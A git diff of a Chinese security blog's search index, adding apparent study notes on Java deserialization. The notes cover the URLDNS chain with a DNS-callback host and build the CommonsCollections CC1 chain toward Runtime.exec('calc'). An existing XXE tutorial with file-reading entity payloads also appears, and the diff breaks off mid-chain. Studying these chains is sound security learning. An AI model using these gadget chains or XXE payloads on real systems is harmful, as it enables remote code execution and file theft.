@@ -11,7 +11,7 @@
 <p>一个XML文档结构包括、<code>XML声明、文档类型定义DTD（可选）、文档元素</code>。</p>
 <p>例如下面这一段就是标准的XML文档</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">user</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="keyword">user</span> (<span class="keyword">username</span>, <span class="keyword">password</span>)&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="keyword">username</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="keyword">password</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">username</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="4d4d27c0633b434f8243f7d8b50a5ce2.png" alt="在这里插入图片描述"></p>
+<p><img src="4d4d27c0633b434f8243f7d8b50a5ce2.png" alt=""></p>
 <p>通过DTD可以验证XML是否符合正确的语法规则 （DTD实际上类似一段说明文字,说明XML文档的组成元素及结构,如果这里将DTD中的username改为name,打开XML文档并不会报错,只是不符合DTD中定义的语法规则）,DTD可以本地声明,也可以外部引用,而XXE主要就是从DTD入手。</p>
 <h1 id="DTD实体">DTD实体</h1>
 <p>实体是<code>用于定义引用普通文本或特殊字符的快捷方式的变量</code>,可在内部或外部进行声明。</p>
@@ -21,14 +21,14 @@
 <p>例如：</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">user</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="string">&quot;admin&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>在浏览器中打开</p>
-<p><img src="470a490266c14d9d8af3bc61cca3c847.png" alt="在这里插入图片描述"></p>
+<p><img src="470a490266c14d9d8af3bc61cca3c847.png" alt=""></p>
 <p>而外部实体声明方式为： <code>&lt;!ENTITY 名字 SYSTEM &quot;URI/URL&quot;&gt;</code></p>
 <p>例如：</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">user</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;admin.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>admin.txt中的内容如下<br>
-<img src="2f42b5236de848d99d31ff0d72379852.png" alt="在这里插入图片描述"></p>
+<img src="2f42b5236de848d99d31ff0d72379852.png" alt=""></p>
 <p>在IE8浏览器(其他浏览器显示不出来)中打开</p>
-<p><img src="3043d1c444e2426fbcede512168256e4.png" alt="在这里插入图片描述"></p>
+<p><img src="3043d1c444e2426fbcede512168256e4.png" alt=""></p>
 <p>同时在引用外部实体时,可以使用不同的协议类型来引用 ：</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">file:///path/file.txt</span><br><span class="line">http://url/file.txt</span><br><span class="line">php://filter/read=convert.base64-encode/resource=file.txt</span><br></pre></td></tr></table></figure>
 <p>聪明的你们一定已经发现了,只要将admin.txt换成其他文件,就可以实现文件的任意读取了</p>
@@ -68,7 +68,7 @@
 <p>一个简单的例子</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="comment">//通过php伪协议直接接收POST传参</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$data</span>, <span class="string">&quot;SimpleXMLElement&quot;</span>, LIBXML_NOENT);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xml</span>-&gt;username;</span><br></pre></td></tr></table></figure>
 <p>利用XXE读取log.txt的内容<br>
-<img src="4d7a3d360f154acc92b406c30ac7e9e3.png" alt="在这里插入图片描述"></p>
+<img src="4d7a3d360f154acc92b406c30ac7e9e3.png" alt=""></p>
 <h1 id="防御">防御</h1>
 <p>XXE的防御一般通过两种方式<br>
 1.使用开发语言提供的禁用外部实体的方法, 例如php中使用<code>libxml_disable_entity_loader(true)</code><br>
@@ -133,6 +133,12 @@
       </tags>
   </entry>
   <entry>
+    <title>新年好</title>
+    <url>/post/happy-new-year/</url>
+    <content><![CDATA[<p>欢迎来到1y0ng的blog,今天是2023年的第一天，祝大家新年快乐</p>
+]]></content>
+  </entry>
+  <entry>
     <title>Hello World</title>
     <url>/post/hello-world/</url>
     <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
@@ -150,6 +156,141 @@
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
 <p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>java反序列化之DNSURL和CommonsCollections（学习记录）</title>
+    <url>/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BDNSURL%E5%92%8CCommonsCollections%EF%BC%88%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="序列化与反序列化">序列化与反序列化</h1>
+<p>java序列化是通过<code>ObjectOutputStream</code>类中的<code>writeObject</code>方法</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">(Object a)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.ser&quot;</span>));</span><br><span class="line">    objectOutputStream.writeObject(a);</span><br><span class="line">    objectOutputStream.close();</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<p>反序列化是通过<code>ObjectInputStream</code>类中的<code>readObject</code>方法</p>
+ <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">public</span> Object <span class="title function_">Unserialize</span><span class="params">()</span> <span class="keyword">throws</span>  Exception&#123;</span><br><span class="line">    <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.cer&quot;</span>));</span><br><span class="line">    <span class="type">People</span> <span class="variable">people</span> <span class="operator">=</span> (People) objectInputStream.readObject();</span><br><span class="line">    objectInputStream.close();</span><br><span class="line">    <span class="keyword">return</span> people;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>序列化和反序列化这是两个很正常的功能，但我们稍加利用就可以用它来执行恶意代码</p>
+<h1 id="DNSURL">DNSURL</h1>
+<h2 id="readObject">readObject</h2>
+<p><img src="c58b649d5bef48cf88f321c317826a61.png" alt=""></p>
+<p>如果反序列化的类中<code>本身带有readObject方法</code>，那么在反序列化的时候就会调用类中的readObject方法</p>
+  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这里必须是private</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream objectInputStream)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">      objectInputStream.defaultReadObject();</span><br><span class="line">      System.out.println(<span class="string">&quot;people的readObject被调用了&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p><img src="d60e544ca13b4b809c3d1f273d2c1441.png" alt="在这里插入图片描述"></p>
+<h2 id="HashMap">HashMap</h2>
+<p>而对于hashmap这个java内置类是可序列化并带有readObject方法的，同时readObject又调用了hash方法<br>
+<img src="f89214c72fc341deb5641f19278037f2.png" alt="在这里插入图片描述">hash方法里又调用了key的hashCode方法<br>
+<img src="f59293f999814a9d8a5e455257cf5dc0.png" alt="在这里插入图片描述"><br>
+这里的hashCode是Object类中的方法<br>
+<img src="1c29f42171b948709d29e56c833b010b.png" alt="在这里插入图片描述"><br>
+但URL类中也有一个hashCode方法<br>
+<img src="6f25d1673b064347ad78358b51a122da.png" alt="在这里插入图片描述"><br>
+这个hashCode会调用handler类的hashCode方法,而getHostAddress会向输入的url发送dns查询请求<br>
+<img src="32965cd52fc241a581c3ba0ed1983f66.png" alt="在这里插入图片描述"><br>
+总的来说就是<br>
+HashMap.readObject()-&gt;HashMap.hash()-&gt;key.hashCode()<br>
+URL.hashCode()-&gt;handler.hashCode()-&gt;getHostAddress()</p>
+<p>我们如果让URL类作为HashMap的key,就会调用URL.hashCode()，最终调用getHostAddress（）<br>
+可以通过dnslog来判断getHostAddress方法是否执行，然而仅仅只是以下的方法是不行的</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap&lt;URL,Integer&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();</span><br><span class="line">hashMap.put(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://w85euszvkqr7x2s5cjco79cj0a63us.oastify.com&quot;</span>),<span class="number">1</span>);</span><br><span class="line">Serialize(hashMap);</span><br></pre></td></tr></table></figure>
+<p>因为HashMap的put方法已经调用了hash方法<br>
+<img src="0201dc94792d4b76a4be1549a2a78bb2.png" alt="在这里插入图片描述"><br>
+而且要调用URL的hashcode方法，URL中的私有属性hashCode必须为-1，但在初始化以后该值就变了，所以我们要通过反射的方法，将hashCode重新变为-1</p>
+<h2 id="反射">反射</h2>
+<p>Java中的反射是指在运行时动态地获取类的信息并操作类的属性、方法和构造函数等。通过反射，可以在运行时获取类的信息，包括类名、父类、接口、方法、属性等，并且可以在运行时动态地创建对象、调用方法、访问属性等</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//得到Class对象</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> people.getClass();<span class="comment">//通过getClass获取指定对象的Class</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;People&quot;</span>);<span class="comment">//通过forName获取指定名字的Class</span></span><br><span class="line"><span class="comment">//获取实例化对象</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">peopleconstructor</span> <span class="operator">=</span> c.getConstructor(<span class="type">int</span>.class,String.class);<span class="comment">//确定实例化方法</span></span><br><span class="line"><span class="type">People</span> <span class="variable">p</span> <span class="operator">=</span> (People)peopleconstructor.newInstance(<span class="number">12</span>,<span class="string">&quot;jack&quot;</span>);<span class="comment">//使用newInstance方法实例化</span></span><br><span class="line"><span class="comment">//获取类的属性</span></span><br><span class="line">Field[] peoplefields = c.getFields();<span class="comment">//获取类中所有的公有属性</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">agefield</span> <span class="operator">=</span> c.getField(<span class="string">&quot;age&quot;</span>);<span class="comment">//获取类中名为age的属性</span></span><br><span class="line">Field[] peoplefields = c.getDeclaredFields();<span class="comment">//获取类中所有的私有属性</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">namefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;name&quot;</span>);<span class="comment">//获取类中名为name的私有属性</span></span><br><span class="line">namefield.setAccessible(<span class="literal">true</span>);<span class="comment">//允许修改私有属性</span></span><br><span class="line">namefield.set(p,<span class="string">&quot;tony&quot;</span>);<span class="comment">//利用set方法将对象p的name属性的值修改为tony</span></span><br><span class="line"><span class="comment">//调用类里的方法</span></span><br><span class="line">Method[] poplemethods = c.getMethods();<span class="comment">//获取所有的公共方法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">changnamemethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;changname&quot;</span>);<span class="comment">//获取changename方法</span></span><br><span class="line">changnamemethod.invoke(p,<span class="string">&quot;perter&quot;</span>);<span class="comment">//调用chanename方法并传入参数“perter”</span></span><br></pre></td></tr></table></figure>
+<h2 id="结果">结果</h2>
+<p>通过反射我们可以在初始化url类以后再把hashCode的值转回-1</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap&lt;URL,Integer&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();</span><br><span class="line">URL url=<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://w85euszvkqr7x2s5cjco79cj0a63us.oastify.com&quot;</span>);</span><br><span class="line">Class c=url.getClass();<span class="comment">//获取url的类</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">hashcodefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);<span class="comment">//得到hashCode属性</span></span><br><span class="line">hashcodefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">hashcodefield.set(url,<span class="number">12345</span>);<span class="comment">//防止在put的时候发送请求，将hashCode的值修改为12345</span></span><br><span class="line">hashMap.put(url,<span class="number">1</span>);</span><br><span class="line">hashcodefield.set(url,-<span class="number">1</span>);<span class="comment">//将hashCode的值修改为-1</span></span><br><span class="line">Serialize(hashMap);</span><br></pre></td></tr></table></figure>
+<p>那么在序列化的时候dnslog就不会收到dns请求<br>
+而反序列化的时候就会收到dns请求了<br>
+<img src="9eec5831654c4b729f22aa1b5be6eac7.png" alt="在这里插入图片描述"></p>
+<h1 id="Commonscollections">Commonscollections</h1>
+<h2 id="环境">环境</h2>
+<p>使用的jdk版本是8u65（需要在<code>8u71</code>以下），同时下载对应的openjdk，并复制sun文件添加进idea</p>
+<p>Commonscollections使用的版本是存在漏洞的<code>3.2.1</code>版本</p>
+<h2 id="InvokerTransformer">InvokerTransformer</h2>
+<p>maven包中有一个<code>Transformer</code>接口，定义了一个transform方法，有非常多的实现类</p>
+<p><img src="image-20230321214051542.png" alt="image-20230321214051542"></p>
+<p>其中主要产生漏洞的是<code>InvokerTransformer</code>类的transform方法</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//InvokerTransformer构造方法</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iMethodName = methodName;</span><br><span class="line">        iParamTypes = paramTypes;</span><br><span class="line">        iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//transform方法</span></span><br><span class="line">	<span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">                </span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>transform方法会通过反射来调用input对象的methodName方法，其中传入的参数为args，参数类型为paramTypes，故此以下代码就会调出计算机</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//a.b(c)=new InvokerTransformer(b,new Class[]&#123;c对应的类对象&#125;,new Object[]&#123;c&#125;).transform(a);</span></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(runtime);</span><br></pre></td></tr></table></figure>
+<p>我们的目标是找到一个重写了readObject的类，通过一条利用链最终调用这个transform方法</p>
+<h2 id="TransformedMap">TransformedMap</h2>
+<p>接下来要找一下谁调用了nvokerTransformer类的transform方法（最好不同名字）</p>
+<p>可以看到在TransformedMap的checkSetValue中有被调用</p>
+<p><img src="image-20230321221426491.png" alt="image-20230321221426491"></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>那么这里就要让<code>TransformedMap.valueTransformer=invokerTransformer对象</code></p>
+<p>而TransformedMap有个<code>decorate</code>方法</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>利用链：TransformedMap.checkSetValue()-&gt;InvokerTransformer.transform()</code></p>
+<p>命令执行代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line">HashMap&lt;Object,Object&gt; map = new HashMap&lt;Object, Object&gt;();</span><br><span class="line">map.put(&quot;key&quot;,&quot;value&quot;);</span><br><span class="line">TransformedMap.decorate(map,null,invokerTransformer);</span><br></pre></td></tr></table></figure>
+<h2 id="AbstractInputCheckedMapDecorator">AbstractInputCheckedMapDecorator</h2>
+<p>然后去找调用了checkSetValue的方法，发现只有一个AbstractInputCheckedMapDecorator的setValue方法</p>
+<p><img src="image-20230321222118113.png" alt="image-20230321222118113"></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    value = parent.checkSetValue(value);</span><br><span class="line">    <span class="keyword">return</span> entry.setValue(value);<span class="comment">//从这一行可以推断出是对entry.setValue()方法的重写</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里很明显是对entry.setValue()方法的一个重写，所以我们只需要在迭代器遍历Map时执行entry.setValue()即可</p>
+<p><code>利用链：AbstractInputCheckedMapDecorator.MapEntry.setValue()-&gt;TransformedMap.checkSetValue()-&gt;InvokerTransformer.transform()</code></p>
+<p>命令执行代码：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;();</span><br><span class="line">map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line"><span class="keyword">for</span>(Map.Entry entry:transformedMap.entrySet())&#123;</span><br><span class="line">    entry.setValue(runtime);<span class="comment">//这里的“value”也就是InvokerTransformer.transform(Object input)中的input,所以是runtime对象</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="image-20230321224034922.png" alt="image-20230321224034922"></p>
+<p>接下类同样得去找一个类调用了setValue()方法，并且这个类最好是通过readObject调用的</p>
+<h2 id="AnnotationInvocationHandler">AnnotationInvocationHandler</h2>
+<p>最终我们找到了sun.reflect.annotation.AnnotationInvocationHandler类中的readObject方法</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">    <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                  value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                memberValue.setValue(<span class="comment">//这里调用了setValue()方法！！！</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                        value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>反序列化的时候会通过迭代器遍历this.memberValues，所以这里要让<code>this.memberValues=transformedMap</code></p>
+<p>来看看AnnotationInvocationHandler类的构造方法</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">            superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">            superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个构造方法没有修饰符只具有包级别访问权限，所以这里我们只能通过反射来调用来实例化对象，同时第一个参数只允许是注解类型或其子类</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(Override.class,transformedMap);</span><br></pre></td></tr></table></figure>
+<h2 id="存在的问题">存在的问题</h2>
+<p>目前已经可以将我们构造的map传进去了，但仍然面临几个问题</p>
+<p>1.Runtime类没有实现Serializable，无法反序列化</p>
+<p>2.要想程序执行到setValue()方法，前面有2个if判断语句得想办法</p>
+<p>3.AnnotationInvocationHandler类里的setvalue()参数为</p>
+<p>new AnnotationTypeMismatchExceptionProxy(value.getClass() + “[” + value + “]”).setMember(annotationType.members().get(name))</p>
+<p>但这并不是我们想传入的参数</p>
+<p>一个一个来解决吧</p>
+<h3 id="Runtime类反序列化">Runtime类反序列化</h3>
+<p>我们可以通过<code>反射+ChainedTransformer</code>来解决</p>
+<p>反射创建Runtime实例并调用exec()</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class  c = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">Method m = c.getMethod(&quot;getRuntime&quot;);</span><br><span class="line">Runtime r = (Runtime) m.invoke(null,null);</span><br><span class="line">Method execmethod = c.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line">execmethod.invoke(r,&quot;calc&quot;);</span><br><span class="line">Runtime.getRuntime().exec(&quot;calc&quot;);</span><br></pre></td></tr></table></figure>
+<p>将上述代码转换成用InvokerTransformer类的transform方法实现</p>
